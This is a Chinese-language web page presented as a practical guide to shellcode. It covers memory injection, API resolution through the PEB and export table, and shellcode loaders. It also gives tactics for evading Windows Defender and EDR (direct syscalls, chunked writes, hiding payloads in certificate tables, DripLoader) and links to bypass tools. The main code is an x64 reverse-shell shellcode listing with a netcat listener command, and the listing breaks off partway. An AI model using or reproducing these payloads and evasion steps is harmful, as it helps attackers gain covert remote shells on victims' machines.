@@ -1,0 +1,289 @@
+<!doctypehtml><html lang="zh-TW"><meta name="twitter:image"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.png"><meta name="twitter:description"content="詳述 Shellcode 注入與 API 解析原理，涵蓋 PIC 技術、載入器開發及 DripLoader 實作。提供防毒規避策略與反向 Shell 代碼，掌握核心攻防技術。"><meta name="twitter:title"content="Shellcode-核心技術-攻防實戰指南"><meta name="twitter:card"content="summary_large_image"><meta property="og:type"content="article"><meta property="og:site_name"content="WellWells"><meta property="og:image"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.png"><meta property="og:url"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.html"><meta property="og:description"content="詳述 Shellcode 注入與 API 解析原理，涵蓋 PIC 技術、載入器開發及 DripLoader 實作。提供防毒規避策略與反向 Shell 代碼，掌握核心攻防技術。"><meta property="og:title"content="Shellcode-核心技術-攻防實戰指南"><meta name="description"content="詳述 Shellcode 注入與 API 解析原理，涵蓋 PIC 技術、載入器開發及 DripLoader 實作。提供防毒規避策略與反向 Shell 代碼，掌握核心攻防技術。"><meta charset="UTF-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>Shellcode 核心技術與攻防實戰指南</title><link rel="preconnect"href="https://fonts.googleapis.com"><link rel="preconnect"href="https://fonts.gstatic.com"crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Noto+Sans+TC:wght@300;400;500;700&family=Fira+Code:wght@400;500&display=swap"rel="stylesheet"><link rel="stylesheet"href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><script type="module">import mermaid from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";mermaid.initialize({startOnLoad:!0,theme:"dark",securityLevel:"loose",fontFamily:'"Noto Sans TC", sans-serif',fontSize:16,flowchart:{curve:"basis",padding:24,nodeSpacing:80,rankSpacing:80,useMaxWidth:!0,htmlLabels:!0},themeVariables:{fontSize:"16px",fontFamily:'"Noto Sans TC", sans-serif'}})</script><script src="https://cdn.tailwindcss.com"></script><script>tailwind.config={theme:{extend:{fontFamily:{sans:["Inter","Noto Sans TC","sans-serif"],mono:["Fira Code","monospace"]},colors:{slate:{850:"#1e293b",900:"#0f172a",950:"#020617"}},animation:{"fade-in":"fadeIn 0.8s ease-out","slide-up":"slideUp 0.6s ease-out forwards"},keyframes:{fadeIn:{"0%":{opacity:"0"},"100%":{opacity:"1"}},slideUp:{"0%":{transform:"translateY(30px)",opacity:"0"},"100%":{transform:"translateY(0)",opacity:"1"}}}}}}</script><style>::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:#0f172a}::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#475569}.glass-card{background:rgba(30,41,59,.4);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.05);box-shadow:0 8px 32px 0 rgba(0,0,0,.37);transition:all .3s ease}.glass-card:hover{border-color:rgba(56,189,248,.2);box-shadow:0 12px 40px 0 rgba(0,0,0,.6)}.code-window{background:#0d1117;border-radius:.75rem;border:1px solid #30363d;overflow:hidden}.code-header{background:#161b22;padding:.75rem 1rem;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between}.mermaid-container{background:rgba(15,23,42,.6);border-radius:.75rem;padding:1.5rem;display:flex;justify-content:center;overflow-x:auto;border:1px dashed rgba(148,163,184,.2)}.mermaid-large{min-width:100%;display:block}.mermaid-large svg{width:100%!important;height:auto!important;transform-origin:0 0}@media (min-width:768px){.mermaid-large svg{transform:scale(1.18)}}.mermaid-large .node text{font-size:16px!important;font-weight:600!important}.mermaid-large .edgeLabel,.mermaid-large .label{font-size:14px!important}ul.custom-list{list-style:none;padding-left:0}ul.custom-list li{position:relative;padding-left:1.5rem;margin-bottom:.5rem}ul.custom-list li::before{content:'▹';position:absolute;left:0;color:#38bdf8}strong{color:#38bdf8;font-weight:600}.section-title{display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem}.section-line{height:2rem;width:4px;border-radius:2px}a{color:#38bdf8;text-decoration:none;transition:color .2s;border-bottom:1px dotted transparent}a:hover{color:#7dd3fc;border-bottom-color:#7dd3fc}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-JKC4KZLT26"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JKC4KZLT26")</script><body class="bg-slate-950 min-h-screen text-slate-300 font-sans antialiased selection:bg-sky-500/30 selection:text-sky-200 overflow-x-hidden"><div class="fixed top-0 left-0 w-full h-full overflow-hidden -z-10 pointer-events-none"><div class="absolute top-[-20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-indigo-900/20 blur-[120px]"></div><div class="absolute bottom-[-20%] left-[-10%] w-[50%] h-[50%] rounded-full bg-sky-900/10 blur-[120px]"></div></div><main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-20"><header class="text-center space-y-6 animate-fade-in pt-10"><div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-slate-800 to-slate-900 border border-slate-700 shadow-2xl mb-4"><i class="fa-solid fa-code text-3xl text-sky-400"></i></div><h1 class="text-4xl md:text-5xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-sky-200 via-white to-indigo-200 tracking-tight leading-tight">Shellcode 核心技術與攻防實戰指南</h1><p class="text-lg text-slate-400 max-w-3xl mx-auto font-light">深入探討記憶體注入、API 解析、載入器開發及高階規避技術的完整技術手冊。</header><section class="animate-slide-up"><div class="section-title"><div class="section-line bg-sky-500"></div><h2 class="text-3xl font-bold text-white">Shellcode 簡介</h2></div><div class="glass-card rounded-2xl p-8"><p class="text-slate-300 leading-relaxed text-lg">Shellcode 是一種機器碼（Machine Code），當被注入到目標處理序（Process）的記憶體中時，會執行特定的操作。它通常作為漏洞利用（Exploits）中的有效載荷（Payload），執行諸如開啟命令列 Shell、建立網路連線或執行任意指令等動作。</div></section><section class="animate-slide-up"style="animation-delay:.1s"><div class="section-title"><div class="section-line bg-blue-500"></div><h2 class="text-3xl font-bold text-white">Shellcode 基本概念</h2></div><div class="grid grid-cols-1 gap-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-microchip text-sky-400"></i> Shellcode 執行模式</h3><p class="mb-4 text-slate-400">Shellcode 注入通常遵循「配置-寫入-執行」（Allocate-Write-Execute）模式：<ol class="list-decimal list-inside space-y-2 mb-6 text-slate-300 ml-2"><li>配置大小與 Shellcode 相符的 RWX（可讀可寫可執行）記憶體。<li>將 Shellcode 寫入配置的記憶體中。<li>執行已配置記憶體中的內容。</ol><div class="bg-red-900/20 border border-red-500/30 p-4 rounded-lg"><p class="text-red-200 text-sm font-semibold mb-2"><i class="fa-solid fa-triangle-exclamation mr-2"></i> OPSEC 警告<p class="text-red-100/80 text-sm">應避免直接使用 <code>PAGE_EXECUTE_READWRITE</code> 進行配置，因為這很容易被標記為可疑。較佳的做法是：<ol class="list-decimal list-inside text-red-100/80 text-sm mt-2 ml-2"><li>使用 <code>PAGE_READWRITE</code> 進行配置。<li>寫入有效載荷（Payload）。<li>將記憶體保護屬性更改為可執行（Executable）。</ol></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-arrows-to-dot text-sky-400"></i> 位置無關程式碼（PIC）技術</h3><div class="mermaid-container"><div class="mermaid mermaid-large">flowchart TB PIC["位置無關程式碼 (PIC)"] GetRIP["獲取目前位址 (RIP)"] Delta["計算偏移量 (Delta)"] Relative["使用相對定址"] Hashing["API 雜湊 (Hashing)"] PIC --> GetRIP PIC --> Delta PIC --> Relative PIC --> Hashing subgraph "Windows 技術" CallPop["Call/Pop 方法"] FPU["FPU 狀態方法"] SEH["SEH 方法"] end subgraph "Linux 技術" GOT["全域偏移表 (GOT)"] VS["VSyscall/VDSO"] end GetRIP --> CallPop GetRIP --> FPU GetRIP --> SEH GetRIP --> GOT GetRIP --> VS</div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.2s"><div class="section-title"><div class="section-line bg-purple-500"></div><h2 class="text-3xl font-bold text-white">Shellcode 開發流程</h2></div><div class="glass-card rounded-2xl p-8"><div class="mermaid-container mb-6"><div class="mermaid">flowchart TB Concept["概念與需求"] Assembly["組合語言程式碼"] Extraction["二進位提取"] Testing["測試與除錯"] Optimization["最佳化"] Encoding["編碼與混淆"] Delivery["傳遞方式"] Concept --> Assembly Assembly --> Extraction Extraction --> Testing Testing --> Optimization Optimization --> Encoding Encoding --> Delivery subgraph "開發階段" Assembly Extraction Testing Optimization end subgraph "規避階段" Encoding end subgraph "漏洞利用階段" Delivery end</div></div></div></section><section class="animate-slide-up"style="animation-delay:.3s"><div class="section-title"><div class="section-line bg-emerald-500"></div><h2 class="text-3xl font-bold text-white">Windows Shellcode 機制</h2></div><div class="space-y-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-6">Windows Shellcode 的 API 解析流程</h3><div class="grid grid-cols-1 md:grid-cols-2 gap-8"><div><p class="text-slate-400 mb-4">識別 <code>kernel32.dll</code> 與解析函數的完整過程：<ul class="custom-list text-sm text-slate-300 space-y-2"><li>取得 <code>PEB->Ldr.InMemoryOrderModuleList</code>。<li>迭代遍歷 <code>InMemoryOrderModuleList</code>；在 Win10/11+ 順序通常為：exe 本身 → <code>ntdll.dll</code> → <code>kernel32.dll</code>。透過名稱雜湊比對定位。<li>解析匯出位址表（Export Address Table, EAT）。<li>迴圈遍歷 EAT 尋找 <code>GetProcAddress</code> 的名稱。<li>取得函數序號（Ordinal）後取得位址（獲得 <code>GetProcAddress</code> 權限）。<li>在解析 <code>LoadLibraryA</code> 前確保 <code>GetProcAddress</code> 可用；兩者可在同一列舉迴圈獲取。<li>使用 <code>GetProcAddress</code> 解析 <code>LoadLibraryA</code> 並載入 <code>WS2_32.dll</code>。<li>取得並呼叫 <code>WSAStartup</code>。<li>查詢 <code>WSASocketA</code> 建立 Socket。<li>查詢 <code>WSAConnect</code> 連線到該 Socket。<li>再次從 <code>kernel32.dll</code> 找到 <code>CreateProcessA</code>。<li>將 <code>cmd.exe</code> 推入堆疊，填充 <code>STARTUPINFOA</code> 並呼叫 <code>CreateProcessA</code>。<li>本地監聽：<code>nc -nvv -p 443 -l</code>。</ul></div><div class="flex flex-col gap-4"><div class="code-window h-full"><div class="code-header"><span class="text-xs text-slate-400 font-mono">WinDbg Commands</span><div class="flex gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-red-500"></div><div class="w-2.5 h-2.5 rounded-full bg-yellow-500"></div><div class="w-2.5 h-2.5 rounded-full bg-green-500"></div></div></div><div class="p-4 overflow-x-auto text-xs font-mono text-slate-300 bg-slate-900 h-full"><pre># 取得 PEB 位址
+dt nt!_TEB -y ProcessEnvironmentBlock @$teb
+
+# 取得 Ldr 位址
+dt nt!_PEB -y Ldr &lt;peb_addr&gt;
+
+# 列出已載入模組的鏈結串列
+dt -r _PEB_LDR_DATA &lt;ldr_addr&gt;
+
+# DllBase 和 FullDllName 這裡會很有用
+dt _LDR_DATA_TABLE_ENTRY (&lt;intialization_flink_addr&gt; - 0x10)
+
+# 執行下方的 Python 程式碼後進行驗證
+lm m kernel32
+r @r8</pre></div></div></div></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-6">Shellcode 執行流程 (Windows)</h3><div class="mermaid-container"><div class="mermaid mermaid-large">flowchart LR Entry["入口點"] GetPEB["取得 PEB 位址"] LocateKernel["定位 kernel32.dll"] FindFunction["尋找 API 函數"] Payload["執行有效載荷"] Cleanup["清理與退出"] Entry --> GetPEB GetPEB --> LocateKernel LocateKernel --> FindFunction FindFunction --> Payload Payload --> Cleanup subgraph "API 解析" GetPEB LocateKernel FindFunction end subgraph "核心功能" Payload Cleanup end</div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.4s"><div class="section-title"><div class="section-line bg-amber-500"></div><h2 class="text-3xl font-bold text-white">Shellcode 載入器 (Loaders)</h2></div><div class="space-y-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">基本模式</h3><div class="code-window mb-6"><div class="code-header"><span class="text-xs text-slate-400 font-mono">C / C++</span></div><div class="p-4 overflow-x-auto font-mono text-sm text-slate-300"><pre><span class="text-purple-400">char</span> *shellcode = <span class="text-green-400">"\xAA\xBB..."</span>;
+<span class="text-purple-400">char</span> *dest = <span class="text-yellow-300">VirtualAlloc</span>(NULL, 0x1234, 0x3000, p_RW);
+<span class="text-yellow-300">memcpy</span>(dest, shellcode, 0x1234);
+<span class="text-yellow-300">VirtualProtect</span>(dest, 0x1234, p_RX, &result);
+(*(<span class="text-purple-400">void</span>(*)())(dest))();  <span class="text-slate-500">// 跳轉至 dest：執行 shellcode</span></pre></div></div><h4 class="text-lg font-bold text-amber-400 mb-2">認識 Shellcode 載入器</h4><p class="text-slate-400 text-sm mb-4">載入器負責將 Shellcode 作為輸入，驗證環境（Anti-Sandbox），解密並安全注入。它可能存在於處理序樹或模組列表中。<div class="flex flex-wrap gap-2 mb-4"><span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Rust (安全但體積大)</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Nim</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Go (特徵明顯)</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Zig (體積小/無依賴)</span></div></div><div class="grid grid-cols-1 md:grid-cols-3 gap-6"><div class="glass-card rounded-2xl p-6"><h4 class="text-lg font-bold text-sky-400 mb-3">1. 配置階段 (Allocation)</h4><ul class="custom-list text-sm text-slate-400"><li><strong>目標：</strong>新記憶體區域、Code caves、Stack/Heap。<li><strong>技術：</strong><code>VirtualAllocEx</code>, <code>NtAllocateVirtualMemory</code>, <code>ZwCreateSection</code>。<li><strong>最佳實踐：</strong>配置 RW → 寫入 → 切換為 RX (避免直接 RWX)。</ul></div><div class="glass-card rounded-2xl p-6"><h4 class="text-lg font-bold text-sky-400 mb-3">2. 寫入階段 (Write)</h4><ul class="custom-list text-sm text-slate-400"><li><strong>技術：</strong><code>WriteProcessMemory</code>, <code>NtWriteVirtualMemory</code>, <code>memcpy</code>。<li><strong>規避策略：</strong><ul class="pl-4 mt-1 text-xs text-slate-500 space-y-1"><li>- 前置無用操作碼 (Dummy opcodes)<li>- 分塊 (Chunks) 隨機順序寫入<li>- 加入寫入延遲</ul></ul></div><div class="glass-card rounded-2xl p-6 border-l-4 border-l-red-500"><h4 class="text-lg font-bold text-red-400 mb-3">3. 執行階段 (Execute)</h4><p class="text-xs text-slate-500 mb-2">最脆弱的步驟，EDR 重點監控。<ul class="custom-list text-sm text-slate-400 mb-4"><li><code>CreateRemoteThread</code><li><code>NtSetContextThread</code> / <code>NtQueueApcThreadEx</code><li>API Hooks / Trampolines</ul><div class="bg-slate-800/50 p-3 rounded-lg"><p class="text-xs font-bold text-slate-300 mb-2">間接執行技術：<div class="flex flex-col gap-1 text-xs"><a href="https://github.com/Wra7h/FlavorTown"target="_blank">🔗 FlavorTown</a> <a href="https://github.com/aahmad097/AlternativeShellcodeExec"target="_blank">🔗 AlternativeShellcodeExec</a> <a href="https://github.com/caueb/ThreadlessC"target="_blank">🔗 ThreadLess</a></div></div></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">Exec/DLL 轉換與工具</h3><div class="grid grid-cols-1 md:grid-cols-2 gap-8"><div><h4 class="text-sm font-bold text-indigo-400 mb-2">轉換工具</h4><ul class="custom-list text-sm text-slate-400 space-y-1"><li><a href="https://github.com/TheWover/donut/tree/master"target="_blank">Donut</a> - PE (EXE/DLL) 轉 Shellcode<li><a href="https://github.com/monoxgas/sRDI"target="_blank">sRDI</a> - DLL 轉 PIC Shellcode<li><a href="https://github.com/hasherezade/pe_to_shellcode"target="_blank">Pe2shc</a> - PE 轉 Shellcode<li><a href="https://github.com/EgeBalci/amber"target="_blank">Amber</a> - 反射式 PE 加殼</ul></div><div><h4 class="text-sm font-bold text-pink-400 mb-2">開源載入器</h4><ul class="custom-list text-sm text-slate-400 space-y-1"><li><a href="https://github.com/optiv/ScareCrow"target="_blank">ScareCrow</a> / <a href="https://github.com/chvancooten/NimPackt-v1"target="_blank">NimPackt-v1</a><li><a href="https://github.com/specterops/NullGate"target="_blank">NullGate</a> (Indirect syscalls & Junk-write)<li><a href="https://github.com/cryptomancer/ghost"target="_blank">Ghost</a> (Fiber spoofing & ETW patch)<li><a href="https://github.com/epi052/ThreadlessInject"target="_blank">ThreadlessInject</a> (無新執行緒)<li><a href="https://github.com/mgeeky/ProtectMyTooling"target="_blank">ProtectMyTooling</a> (串接保護)</ul></div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.5s"><div class="section-title"><div class="section-line bg-gray-500"></div><h2 class="text-3xl font-bold text-white">跨平台考量</h2></div><div class="grid grid-cols-1 md:grid-cols-3 gap-6"><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-windows mr-2"></i>Windows on ARM64</h3><p class="text-sm text-slate-400">Snapdragon X Elite / Surface Pro 10。Syscalls 使用 <code>SVC 0</code> 與 <code>ntdll!KiServiceTableArm64</code>。注意 PAC (指標驗證) 簽署 LR 值，避免 Stack pivots。</div><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-linux mr-2"></i>Linux 6.9+</h3><p class="text-sm text-slate-400">引入 BPF Tokens 與共享 <strong>BPF Arena</strong> (可執行)。將 Shellcode 藏在 Arena map 中，透過 <code>bpf_prog_run_pin_on_cpu</code> 執行。</div><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-apple mr-2"></i>macOS SSV</h3><p class="text-sm text-slate-400">系統卷密封。持久化需建立 Snapshot、注入並重簽 (kmutil)。使用者空間則利用 Launch Agents 或 dylib 劫持。</div></div></section><section class="animate-slide-up"style="animation-delay:.6s"><div class="section-title"><div class="section-line bg-red-500"></div><h2 class="text-3xl font-bold text-white">儲存、隱藏與規避技術</h2></div><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">儲存選項</h3><ul class="custom-list text-sm text-slate-400 space-y-2"><li><strong>寫死 (Hardcoded)：</strong>存於 RW/RO 區段，需重新編譯。<li><strong>PE 資源：</strong>RCDATA Blobs (AV 重點掃描)。<li><strong>額外 PE 區段：</strong>倒數第 N 個 R+X 區段。<li><strong>網路獲取：</strong>如 CSharpShooter。<li><strong>證書表 (Certificate Table) ★推薦：</strong>填充 PE 簽章區塊，保持主程式簽章完整 (如 Teams.exe)，僅破壞依賴 DLL (如 ffmpeg.dll)。<li><strong>合法 PE 後門：</strong>植入 Shellcode 與 Loader。</ul><div class="mt-4 p-3 bg-slate-800 rounded border border-slate-700"><span class="text-xs font-bold text-slate-300">保護方法：</span> <span class="text-xs text-slate-400">壓縮 (LZMA) + 加密 (XOR32/RC4/AES)</span></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">規避技術 (Evasion)</h3><div class="space-y-4"><div><h4 class="text-sm font-bold text-sky-400">漸進式規避策略</h4><ol class="list-decimal list-inside text-sm text-slate-400 ml-2"><li>基本執行<li>加密/混淆<li>直接系統呼叫 (Direct Syscalls)<li>遠端程序注入 (Remote Injection)</ol></div><div><h4 class="text-sm font-bold text-green-400">Windows Defender 規避工具</h4><p class="text-xs text-slate-500 mb-1"><a href="https://github.com/hackmosphere/DefenderBypass"target="_blank">🔗 DefenderBypass</a><ul class="text-xs text-slate-400 list-disc list-inside ml-2"><li>myEncoder3.py (XOR)<li>InjectSyscall-LocalProcess.cpp (Direct Syscalls, IAT cleanup)<li>Win11 24H2 AMSI 堆積掃描應對：<code>PAGE_NOACCESS</code> → 解密 → <code>PAGE_EXECUTE_READ</code>。</ul></div><div><h4 class="text-sm font-bold text-red-400">本地 vs 遠端注入</h4><p class="text-xs text-slate-400">遠端注入面臨 CFG, CIG, ETW 監控。偵測點包含 ETW Ti, EDR Hooks, 以及回溯執行緒呼叫堆疊 (Call Stack)。</div></div></div></div><div class="glass-card rounded-2xl p-8 mb-8"><h3 class="text-xl font-bold text-white mb-4">進階實作：DripLoader 技術</h3><p class="text-sm text-slate-400 mb-2">程式碼來源：<a href="https://github.com/xuanxuan0/DripLoader"target="_blank">github.com/xuanxuan0/DripLoader</a><ul class="custom-list text-sm text-slate-400 grid grid-cols-1 md:grid-cols-2 gap-2"><li>使用 <code>NO_ACCESS</code> 保留大塊記憶體。<li>在保留池中配置分散的 4KB <code>Read+Write</code> 區塊。<li>分塊隨機順序寫入 Shellcode。<li>重新保護為 <code>Read+Exec</code>。<li>覆寫 <code>ntdll!RtlpWow64CtxFromAmd64</code> 序言作為 JMP 跳板。<li>使用 Direct Syscalls (NtAllocateVirtualMemory 等)。</ul></div></section><section class="animate-slide-up"style="animation-delay:.7s"><div class="section-title"><div class="section-line bg-slate-400"></div><h2 class="text-3xl font-bold text-white">實作範例</h2></div><div class="glass-card rounded-2xl p-1 overflow-hidden"><div class="bg-slate-900 p-4 border-b border-slate-800 flex justify-between items-center"><h3 class="font-bold text-white text-sm">反向 Shell (Reverse Shell) Shellcode 實作</h3><span class="text-xs text-slate-500">Python</span></div><div class="p-0 overflow-x-auto"><div class="code-window rounded-none border-0"><div class="p-6 font-mono text-xs text-slate-300 leading-relaxed"><pre><span class="text-purple-400">import</span> ctypes, struct
+<span class="text-purple-400">from</span> keystone <span class="text-purple-400">import</span> *
+
+CODE = (
+<span class="text-slate-500"># 定位 kernel32 基底位址 (Base Address)</span>
+    <span class="text-green-400">" start:                          "</span>
+    <span class="text-green-400">"   add rsp, 0xfffffffffffffdf8 ;"</span> <span class="text-slate-500"># 避免空位元組 (Null Byte) 並騰出一些空間</span>
+    <span class="text-green-400">" find_kernel32:                  "</span>
+    <span class="text-green-400">"   int3                        ;"</span> <span class="text-slate-500"># Windbg 中斷點，僅在除錯時啟用</span>
+    <span class="text-green-400">"   xor rcx, rcx                ;"</span>
+    <span class="text-green-400">"   mov rax, gs:[rcx + 0x60]    ;"</span> <span class="text-slate-500"># RAX = &(PEB) [(FS:0x60)]</span>
+    <span class="text-green-400">"   mov rax, [rax + 0x18]       ;"</span> <span class="text-slate-500"># RAX = PEB->Ldr</span>
+    <span class="text-green-400">"   mov rsi, [rax + 0x20]       ;"</span> <span class="text-slate-500"># RSI = PEB->Ldr.InMemoryOrderModuleList</span>
+    <span class="text-green-400">"   lodsq                       ;"</span>
+    <span class="text-green-400">"   xchg rax, rsi               ;"</span>
+    <span class="text-green-400">"   lodsq                       ;"</span>
+    <span class="text-green-400">"   mov rbx, [rax + 0x20]       ;"</span> <span class="text-slate-500"># RBX = Kernel32 基底位址</span>
+    <span class="text-green-400">"   mov r8, rbx                 ;"</span> <span class="text-slate-500"># 將 Kernel32 基底位址複製到 R8 暫存器</span>
+<span class="text-slate-500"># 解析匯出位址表 (Export Address Table)</span>
+    <span class="text-green-400">"   mov ebx, [rbx+0x3C]         ;"</span> <span class="text-slate-500"># EBX = Kernel32 PE 簽章 (偏移量 0x3C)</span>
+    <span class="text-green-400">"   add rbx, r8                 ;"</span> <span class="text-slate-500"># RBX = kernel32 基底位址 + 解參考後的簽章偏移量</span>
+    <span class="text-green-400">"   xor r12,r12                 ;"</span>
+    <span class="text-green-400">"   add r12, 0x88FFFFF          ;"</span>
+    <span class="text-green-400">"   shr r12, 0x14               ;"</span>
+    <span class="text-green-400">"   mov edx, [rbx+r12]          ;"</span> <span class="text-slate-500"># 匯出位址表偏移量</span>
+    <span class="text-green-400">"   add rdx, r8                 ;"</span> <span class="text-slate-500"># RDX = kernel32.dll + RVA ExportTable = ExportTable 位址</span>
+    <span class="text-green-400">"   mov r10d, [rdx+0x14]        ;"</span> <span class="text-slate-500"># 函數數量</span>
+    <span class="text-green-400">"   xor r11, r11                ;"</span>
+    <span class="text-green-400">"   mov r11d, [rdx+0x20]        ;"</span> <span class="text-slate-500"># AddressOfNames RVA</span>
+    <span class="text-green-400">"   add r11, r8                 ;"</span> <span class="text-slate-500"># AddressOfNames VMA</span>
+<span class="text-slate-500"># 尋找 GetProcAddress 名稱</span>
+    <span class="text-green-400">"   mov rcx, r10                ;"</span>
+    <span class="text-green-400">" k32findfunction:                "</span>
+    <span class="text-green-400">"   jecxz functionfound         ;"</span> <span class="text-slate-500"># 迴圈直到我們匹配到 'GetProcAddress'</span>
+    <span class="text-green-400">"   xor ebx,ebx                 ;"</span>
+    <span class="text-green-400">"   mov ebx, [r11+4+rcx*4]      ;"</span> <span class="text-slate-500"># EBX = 第一個 AddressOfName 的 RVA</span>
+    <span class="text-green-400">"   add rbx, r8                 ;"</span> <span class="text-slate-500"># RBX = 函數名稱 VMA</span>
+    <span class="text-green-400">"   dec rcx                     ;"</span>
+    <span class="text-green-400">"   mov rax, 0x41636f7250746547 ;"</span> <span class="text-slate-500"># GetProcA</span>
+    <span class="text-green-400">"   cmp [rbx], rax              ;"</span> <span class="text-slate-500"># 檢查是否找到 GetProcA</span>
+    <span class="text-green-400">"   jnz k32findfunction         ;"</span>
+<span class="text-slate-500"># 取得函數位址</span>
+    <span class="text-green-400">" functionfound:                  "</span>
+    <span class="text-green-400">"   xor r11, r11                ;"</span>
+    <span class="text-green-400">"   mov r11d, [rdx+0x24]        ;"</span>
+    <span class="text-green-400">"   add r11, r8                 ;"</span>
+    <span class="text-green-400">"   inc rcx                     ;"</span>
+    <span class="text-green-400">"   mov r13w, [r11+rcx*2]       ;"</span> <span class="text-slate-500"># AddressOfNameOrdinals + 計數器。RCX = 計數器</span>
+    <span class="text-green-400">"   xor r11, r11                ;"</span>
+    <span class="text-green-400">"   mov r11d, [rdx+0x1c]        ;"</span>
+    <span class="text-green-400">"   add r11, r8                 ;"</span> <span class="text-slate-500"># AddressOfFunctions VMA 存入 R11</span>
+    <span class="text-green-400">"   mov eax, [r11+4+r13*4]      ;"</span>
+    <span class="text-green-400">"   add rax, r8                 ;"</span> <span class="text-slate-500"># 將基底位址加到函數 RVA</span>
+    <span class="text-green-400">"   mov r14, rax                ;"</span> <span class="text-slate-500"># GetProcAddress 存入 R14</span>
+<span class="text-slate-500"># 使用 GetProcAddress 解析 LoadLibraryA</span>
+    <span class="text-green-400">"   mov rcx, 0x41797261         ;"</span>
+    <span class="text-green-400">"   push rcx                    ;"</span>
+    <span class="text-green-400">"   mov rcx, 0x7262694c64616f4c ;"</span>
+    <span class="text-green-400">"   push rcx                    ;"</span>
+    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># LoadLibraryA 存入 RDX</span>
+    <span class="text-green-400">"   mov rcx, r8                 ;"</span> <span class="text-slate-500"># 將 Kernel32 基底位址複製到 RCX</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># 呼叫 GetProcessAddress</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+    <span class="text-green-400">"   mov rsi, rax                ;"</span> <span class="text-slate-500"># 將 LoadLibrary 的位址儲存在 RSI</span>
+<span class="text-slate-500"># 對 WS2_32.DLL 呼叫 LoadLibraryA</span>
+    <span class="text-green-400">"   xor rax, rax                ;"</span>
+    <span class="text-green-400">"   mov rax, 0x6C6C             ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x642E32335F325357 ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rcx, rsp                ;"</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call rsi                    ;"</span> <span class="text-slate-500"># 呼叫 LoadLibraryA</span>
+    <span class="text-green-400">"   mov r15, rax                ;"</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   add rsp, 0x10               ;"</span>
+<span class="text-slate-500"># 取得 WSAStartup 位址</span>
+    <span class="text-green-400">"   mov rax, 0x7075             ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rax, 0x7472617453415357 ;"</span>
+    <span class="text-green-400">"   push rax                    ;"</span>
+    <span class="text-green-400">"   mov rdx, rsp                ;"</span> <span class="text-slate-500"># WSAStartup 存入 RDX</span>
+    <span class="text-green-400">"   mov rcx, r15                ;"</span> <span class="text-slate-500"># 將 WS2_32 基底位址複製到 RCX</span>
+    <span class="text-green-400">"   sub rsp, 0x30               ;"</span>
+    <span class="text-green-400">"   call r14                    ;"</span> <span class="text-slate-500"># 呼叫 GetProcessAddress</span>
+    <span class="text-green-400">"   add rsp, 0x30               ;"</span>
